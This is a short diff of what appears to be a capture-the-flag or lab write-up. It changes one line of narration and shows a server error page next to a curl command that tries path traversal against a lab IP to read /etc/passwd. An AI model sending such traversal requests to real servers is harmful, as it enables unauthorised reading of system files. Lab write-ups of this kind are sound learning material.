@@ -150,7 +150,7 @@ c/passwd
 <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
 ```
 
-we got nothing... lets try advanced methods
+we got nothing... lets try "advance" methods
  
 ```bash
 curl http://10.10.120.193/article?name=/../etc/passwd
